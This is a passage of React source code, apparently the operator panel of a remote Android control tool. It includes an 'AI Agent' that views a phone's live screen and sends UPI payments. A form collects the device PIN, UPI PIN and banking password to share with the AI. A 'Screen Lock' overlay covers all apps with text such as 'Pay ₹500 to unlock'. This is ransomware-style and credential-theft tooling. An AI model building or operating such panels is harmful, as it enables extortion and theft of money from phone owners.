                {sending ? 'Sending…' : 'Unlock Device'}
              </button>
            </div>
          )}
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}

function MenuItem({ icon, label, desc, onClick }) {
  return (
    <button onClick={onClick} className="w-full flex items-center gap-3 px-3.5 py-3 hover:bg-white/[0.05] active:bg-white/10 transition-colors text-left border-b border-white/[0.04] last:border-b-0">
      <div className="w-9 h-9 rounded-lg bg-white/[0.05] border border-white/[0.08] flex items-center justify-center text-white/75 flex-shrink-0">{icon}</div>
      <div className="flex-1 min-w-0">
        <div className="text-[12px] font-bold text-white/95 leading-tight">{label}</div>
        <div className="text-[10px] text-white/45 mt-0.5">{desc}</div>
      </div>
      <svg viewBox="0 0 24 24" className="w-3.5 h-3.5 stroke-white/30 fill-none flex-shrink-0" strokeWidth="2"><path d="M9 6l6 6-6 6" strokeLinecap="round" strokeLinejoin="round"/></svg>
    </button>
  );
}
function Nav({ children, label, onClick, disabled }) {
  return (
    <button onClick={onClick} disabled={disabled} className="flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-white/[0.05] border border-white/[0.08] text-white/85 hover:bg-white/10 hover:text-white active:scale-95 transition-all disabled:opacity-30 disabled:cursor-not-allowed">
      {children}
      <span className="text-[10px] font-bold tracking-[1.2px] uppercase">{label}</span>
    </button>
  );
}
function Quick({ children, label, onClick, disabled }) {
  return (
    <button onClick={onClick} disabled={disabled} className="flex items-center justify-center gap-1 py-1.5 rounded-lg bg-white/[0.025] border border-white/[0.05] text-[9.5px] font-bold tracking-wide uppercase text-white/55 hover:bg-white/[0.06] hover:text-white/85 active:scale-95 transition-all disabled:opacity-30 disabled:cursor-not-allowed">
      {children}{label}
    </button>
  );
}

function AgentPanel({ open, onClose, messages, pending, loading, input, setInput, onSend, onConfirm,
                      creds, onSaveCreds, credsOpen, setCredsOpen, aiKeyOpen, setAiKeyOpen, deviceId, onClearChat, shotUrl }) {
  const msgsRef   = useRef(null);
  const inputRef  = useRef(null);
  const [localCreds, setLocalCreds] = useState({});
  const [aiKey, setAiKey]           = useState('');
  const [aiModel, setAiModel]       = useState('gpt-4o-mini');
  const [savingKey, setSavingKey]   = useState(false);

  useEffect(() => { if (open) setLocalCreds({ ...creds }); }, [open, creds]);
  useEffect(() => { if (msgsRef.current) msgsRef.current.scrollTop = msgsRef.current.scrollHeight; }, [messages, pending]);
  useEffect(() => { if (open && inputRef.current) setTimeout(() => inputRef.current?.focus(), 300); }, [open]);

  const handleKey = (e) => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); onSend(input); } };

  const saveKey = async () => {
    setSavingKey(true);
    try { await setAiConfigApi(aiKey, aiModel); setAiKeyOpen(false); setAiKey(''); }
    catch {}
    setSavingKey(false);
  };

  const credFields = [
    { key: 'devicePin',   label: 'Device PIN / Password', placeholder: '1234' },
    { key: 'upiPin',      label: 'UPI PIN',                placeholder: '6-digit PIN' },
    { key: 'bankPass',    label: 'Net Banking Password',   placeholder: 'optional' },
    { key: 'notes',       label: 'Extra Notes',            placeholder: 'e.g. Google Pay UPI: 9876543210@okaxis' },
  ];

  const roleStyle = (role) => {
    if (role === 'user')        return 'ml-8 bg-accent/15 border-accent/25 text-white/90 self-end text-right';
    if (role === 'assistant')   return 'mr-8 bg-white/[0.06] border-white/[0.10] text-white/85';
    if (role === 'thinking')    return 'mr-8 bg-violet-500/[0.06] border-violet-500/[0.18] text-violet-200/70 text-[11px] italic';
    return 'mx-4 bg-white/[0.03] border-white/[0.06] text-white/45 text-center text-[10px] italic';
  };

  if (!open) return null;

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-[70] flex flex-col bg-bg"
      >
        {/* Header */}
        <div className="flex items-center gap-2 px-3 py-2.5 border-b border-white/[0.06] bg-bg/90 backdrop-blur-xl flex-shrink-0">
          <button onClick={onClose} className="w-9 h-9 rounded-lg bg-white/[0.05] border border-white/[0.08] flex items-center justify-center text-white/75 hover:bg-white/10 active:scale-95 transition-all">
            <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2.2"><path d="M15 18l-6-6 6-6" strokeLinecap="round" strokeLinejoin="round"/></svg>
          </button>
          <div className="flex-1 min-w-0">
            <div className="text-[9px] font-bold tracking-[1.6px] uppercase text-white/35">AI Agent</div>
            <div className="text-[12px] font-bold text-white/95">Device Automation</div>
          </div>
          <button onClick={() => setCredsOpen(v => !v)} className="px-2 py-1 rounded-lg bg-white/[0.05] border border-white/[0.08] text-[9.5px] font-bold tracking-wide uppercase text-white/55 hover:bg-white/10 active:scale-95 transition-all">
            Creds
          </button>

          <button onClick={onClearChat} className="w-9 h-9 rounded-lg bg-white/[0.05] border border-white/[0.08] flex items-center justify-center text-white/45 hover:text-rose-300 hover:bg-rose-500/10 active:scale-95 transition-all">
            <svg viewBox="0 0 24 24" className="w-3.5 h-3.5 stroke-current fill-none" strokeWidth="2"><path d="M3 6h18M9 6V4h6v2M19 6l-1 14H6L5 6" strokeLinecap="round" strokeLinejoin="round"/></svg>
          </button>
        </div>
        {/* Live screen thumbnail */}
        {shotUrl && (
          <div className="flex-shrink-0 border-b border-white/[0.06] bg-black/50 flex items-center gap-2 px-3 py-1.5">
            <img src={shotUrl} alt="screen" className="h-16 w-auto rounded-md border border-white/10 shadow-md object-contain" />
            <div className="flex-1 min-w-0">
              <div className="text-[8.5px] font-bold tracking-[1.4px] uppercase text-white/35">Live Screen</div>
              <div className="text-[9.5px] text-white/50 mt-0.5">AI is looking at this screen</div>
            </div>
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse flex-shrink-0" />
          </div>
        )}

        {/* Credentials form */}
        <AnimatePresence>
          {credsOpen && (
            <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.2 }} className="overflow-hidden border-b border-white/[0.06] bg-black/30 flex-shrink-0">
              <div className="p-3 space-y-2">
                <div className="text-[9px] font-bold tracking-[1.6px] uppercase text-white/35 mb-1">Device Credentials (stored on server, shared with AI)</div>
                {credFields.map(f => (
                  <div key={f.key} className="flex items-center gap-2">
                    <label className="text-[9.5px] text-white/45 font-bold w-[120px] flex-shrink-0">{f.label}</label>
                    <input
                      type={f.key.includes('Pin') || f.key.includes('Pass') ? 'password' : 'text'}
                      value={localCreds[f.key] || ''}
                      onChange={e => setLocalCreds(c => ({...c, [f.key]: e.target.value}))}
                      placeholder={f.placeholder}
                      className="flex-1 px-2 py-1.5 rounded-lg bg-black/40 border border-white/[0.08] text-[12px] text-white placeholder-white/20 outline-none focus:border-accent/40 transition-colors"
                    />
                  </div>
                ))}
                <button onClick={() => onSaveCreds(localCreds)} className="w-full py-2 rounded-lg bg-accent/15 border border-accent/30 text-[11px] font-bold tracking-[1.2px] uppercase text-accent hover:bg-accent/25 active:scale-95 transition-all">
                  Save Credentials
                </button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Messages */}
        <div ref={msgsRef} className="flex-1 min-h-0 overflow-y-auto px-3 py-3 space-y-2">
          {messages.length === 0 && !loading && (
            <div className="flex flex-col items-center justify-center h-full gap-3 text-white/30 pointer-events-none">
              <svg viewBox="0 0 24 24" className="w-10 h-10 stroke-current fill-none opacity-40" strokeWidth="1.5">
                <circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 015 0c0 2.5-2.5 3-2.5 5" strokeLinecap="round"/><circle cx="12" cy="17.5" r=".5" fill="currentColor" stroke="none"/>
              </svg>
              <div className="text-center">
                <div className="text-[12px] font-bold tracking-wide">AI Agent Ready</div>
                <div className="text-[10px] mt-1 opacity-70">Tell me what to do on the device.<br/>E.g. "Open Google Pay and send ₹100 to Rahul"</div>
              </div>
            </div>
          )}
          {messages.map((m, i) => (
            <div key={i} className={`flex ${m.role === 'user' ? 'justify-end' : m.role === 'system_note' ? 'justify-center' : 'justify-start'}`}>
              <div className={`max-w-[85%] px-3 py-2 rounded-xl border text-[12.5px] leading-relaxed ${roleStyle(m.role)}`}>
                {m.role === 'thinking' && (
                  <div className="flex items-center gap-1.5 mb-1">
                    <svg viewBox="0 0 24 24" className="w-3 h-3 stroke-violet-300/70 fill-none flex-shrink-0" strokeWidth="2"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 015 0c0 2.5-2.5 3-2.5 5" strokeLinecap="round"/><circle cx="12" cy="17.5" r=".5" fill="currentColor" stroke="none"/></svg>
                    <span className="text-[8.5px] font-bold tracking-[1.2px] uppercase text-violet-300/60">Thinking</span>
                  </div>
                )}
                {m.content}
              </div>
            </div>
          ))}
          {loading && (
            <div className="flex justify-start">
              <div className="px-4 py-2.5 rounded-xl border bg-white/[0.06] border-white/[0.10] flex items-center gap-2">
                <span className="w-1.5 h-1.5 bg-accent rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
                <span className="w-1.5 h-1.5 bg-accent rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
                <span className="w-1.5 h-1.5 bg-accent rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
              </div>
            </div>
          )}
        </div>

        {/* Confirm dialog */}
        {pending && (
          <div className="flex-shrink-0 mx-3 mb-2 p-3 rounded-xl bg-amber-500/10 border border-amber-500/30">
            <div className="text-[9px] font-bold tracking-[1.6px] uppercase text-amber-300/70 mb-1">Confirmation Required</div>
            <div className="text-[12.5px] text-amber-100 mb-3">{pending.confirmMessage || 'AI agent wants to perform a sensitive action.'}</div>
            <div className="flex gap-2">
              <button onClick={() => onConfirm(false)} className="flex-1 py-2 rounded-lg bg-white/[0.04] border border-white/[0.12] text-[11px] font-bold tracking-[1.2px] uppercase text-white/60 hover:bg-white/[0.08] active:scale-95 transition-all">
                Reject
              </button>
              <button onClick={() => onConfirm(true)} className="flex-1 py-2 rounded-lg bg-emerald-500/20 border border-emerald-500/40 text-[11px] font-bold tracking-[1.2px] uppercase text-emerald-300 hover:bg-emerald-500/30 active:scale-95 transition-all">
                Confirm — Yes, Do It
              </button>
            </div>
          </div>
        )}

        {/* Input */}
        <div className="flex-shrink-0 px-3 pb-[max(12px,env(safe-area-inset-bottom))] pt-2 border-t border-white/[0.06] bg-bg/80 backdrop-blur-xl">
          <div className="flex items-end gap-2">
            <textarea
              ref={inputRef}
              value={input}
              onChange={e => setInput(e.target.value)}
              onKeyDown={handleKey}
              rows={1}
              placeholder="Tell AI what to do… e.g. Open Paytm and pay ₹200 to 9876543210"
              disabled={loading}
              className="flex-1 px-3 py-2.5 rounded-xl bg-black/40 border border-white/[0.08] text-[13px] text-white placeholder-white/25 outline-none focus:border-accent/40 transition-colors resize-none max-h-24 overflow-y-auto disabled:opacity-50"
              style={{ lineHeight: '1.4' }}
            />
            <button
              onClick={() => onSend(input)}
              disabled={!input.trim() || loading}
              className="w-11 h-11 flex-shrink-0 flex items-center justify-center rounded-xl bg-gradient-to-br from-accent to-accent2 border border-white/15 shadow-[0_8px_24px_-8px_rgba(0,255,170,0.4)] hover:shadow-[0_12px_28px_-8px_rgba(0,255,170,0.6)] active:scale-95 transition-all disabled:opacity-30 disabled:cursor-not-allowed"
            >
              <svg viewBox="0 0 24 24" className="w-4.5 h-4.5 stroke-bg fill-none" strokeWidth="2.5"><path d="M22 2L11 13M22 2L15 22l-4-9-9-4 20-7z" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </button>
          </div>
        </div>

        {/* AI Key Modal */}
        <AnimatePresence>
          {aiKeyOpen && (
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => setAiKeyOpen(false)}
              className="absolute inset-0 bg-black/70 backdrop-blur-[3px] flex items-center justify-center p-4 z-10">
              <motion.div initial={{ scale: 0.94, y: 8 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.94, y: 8 }}
                onClick={e => e.stopPropagation()}
                className="w-full max-w-[360px] glass rounded-2xl border border-white/10 p-5 shadow-[0_30px_80px_-20px_rgba(0,0,0,0.8)]">
                <div className="text-[9px] font-bold tracking-[1.6px] uppercase text-white/35 mb-0.5">OpenAI Configuration</div>
                <div className="text-[14px] font-bold text-white/95 mb-4">Set API Key</div>
                <div className="space-y-3">
                  <div>
                    <label className="text-[9.5px] font-bold tracking-[1.2px] uppercase text-white/45 block mb-1.5">OpenAI API Key</label>
                    <input type="password" value={aiKey} onChange={e => setAiKey(e.target.value)} placeholder="sk-..." className="w-full px-3 py-2.5 rounded-lg bg-black/40 border border-white/[0.08] text-[13px] text-white placeholder-white/20 outline-none focus:border-accent/40 transition-colors" />
                  </div>
                  <div>
                    <label className="text-[9.5px] font-bold tracking-[1.2px] uppercase text-white/45 block mb-1.5">Model</label>
                    <select value={aiModel} onChange={e => setAiModel(e.target.value)} className="w-full px-3 py-2.5 rounded-lg bg-black/40 border border-white/[0.08] text-[13px] text-white outline-none focus:border-accent/40 transition-colors">
                      <option value="gpt-4o-mini">gpt-4o-mini (Fast, cheap)</option>
                      <option value="gpt-4o">gpt-4o (Best quality)</option>
                      <option value="gpt-4-turbo">gpt-4-turbo</option>
                    </select>
                  </div>
                  <div className="flex gap-2 pt-1">
                    <button onClick={() => setAiKeyOpen(false)} className="flex-1 py-2.5 rounded-lg bg-white/[0.04] border border-white/[0.08] text-[11px] font-bold tracking-[1.2px] uppercase text-white/65 hover:bg-white/[0.08] active:scale-95 transition-all">Cancel</button>
                    <button onClick={saveKey} disabled={!aiKey.trim() || savingKey} className="flex-1 py-2.5 rounded-lg bg-gradient-to-br from-accent to-accent2 border border-white/15 text-[11px] font-extrabold tracking-[1.4px] uppercase text-bg shadow-[0_8px_20px_-8px_rgba(0,255,170,0.5)] hover:from-accent/80 active:scale-95 transition-all disabled:opacity-40">
                      {savingKey ? 'Saving…' : 'Save'}
                    </button>
                  </div>
                </div>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>
    </AnimatePresence>
  );
}


function LockModal({ open, onClose, lock, onApply }) {
  const [text, setText] = useState(lock.text || '');
  useEffect(() => { if (open) setText(lock.text || ''); }, [open, lock.text]);
  if (!open) return null;
  return (
    <AnimatePresence>
      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={onClose}
        className="fixed inset-0 z-[60] bg-black/65 backdrop-blur-[3px] flex items-center justify-center p-4">
        <motion.div initial={{ opacity: 0, scale: 0.94, y: 8 }} animate={{ opacity: 1, scale: 1, y: 0 }} exit={{ opacity: 0, scale: 0.94, y: 8 }}
          transition={{ duration: 0.18, ease: [0.22, 1, 0.36, 1] }}
          onClick={(e) => e.stopPropagation()}
          className="w-full max-w-[360px] glass rounded-2xl border border-white/10 shadow-[0_30px_80px_-20px_rgba(0,0,0,0.8)] overflow-hidden">
          <div className="px-4 py-3 border-b border-white/[0.06] flex items-center justify-between">
            <div>
              <div className="text-[9px] font-bold tracking-[1.6px] uppercase text-white/35 leading-none">Screen Lock</div>
              <div className="text-[13px] font-bold text-white/95 mt-0.5">Black Overlay + Text</div>
            </div>
            <span className={`inline-flex items-center gap-1.5 px-2 py-1 rounded-full border text-[9.5px] font-bold tracking-wide uppercase ${lock.on ? 'bg-rose-500/10 border-rose-500/30 text-rose-300' : 'bg-white/[0.04] border-white/[0.08] text-white/55'}`}>
              <span className={`w-1.5 h-1.5 rounded-full ${lock.on ? 'bg-rose-400 animate-pulse-soft' : 'bg-white/30'}`} />
              {lock.on ? 'Active' : 'Off'}
            </span>
          </div>
          <div className="p-4 space-y-3">
            <div>
              <label className="block text-[9.5px] font-bold tracking-[1.4px] uppercase text-white/45 mb-1.5">Display Text</label>
              <textarea
                value={text}
                onChange={(e) => setText(e.target.value)}
                rows={3}
                placeholder="Pay ₹500 to unlock..."
                className="w-full px-3 py-2.5 rounded-lg bg-black/40 border border-white/[0.08] text-[13px] text-white placeholder-white/25 outline-none focus:border-accent/50 focus:bg-black/55 transition-colors resize-none"
              />
              <div className="text-[10px] text-white/40 mt-1">Shows full-screen on the phone over all apps.</div>
            </div>
            <div className="flex items-center gap-2 pt-1">
              <button onClick={onClose} className="flex-1 py-2.5 rounded-lg bg-white/[0.04] border border-white/[0.08] text-[11px] font-bold tracking-[1.2px] uppercase text-white/65 hover:bg-white/[0.08] active:scale-95 transition-all">Cancel</button>
              {lock.on && (
                <button onClick={() => { onApply(false, ''); onClose(); }} className="flex-1 py-2.5 rounded-lg bg-white/[0.04] border border-amber-400/30 text-[11px] font-bold tracking-[1.2px] uppercase text-amber-200 hover:bg-amber-400/10 active:scale-95 transition-all">Unlock</button>
              )}
              <button
                onClick={() => { onApply(true, text); onClose(); }}
                disabled={!text.trim() && !lock.on}
                className="flex-1 py-2.5 rounded-lg bg-gradient-to-br from-rose-500 to-rose-600 border border-rose-400/40 text-[11px] font-extrabold tracking-[1.4px] uppercase text-white shadow-[0_8px_24px_-8px_rgba(244,63,94,0.6)] hover:from-rose-400 hover:to-rose-500 active:scale-95 transition-all disabled:opacity-40 disabled:cursor-not-allowed"
              >
                {lock.on ? 'Update' : 'Lock'}
              </button>
            </div>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}
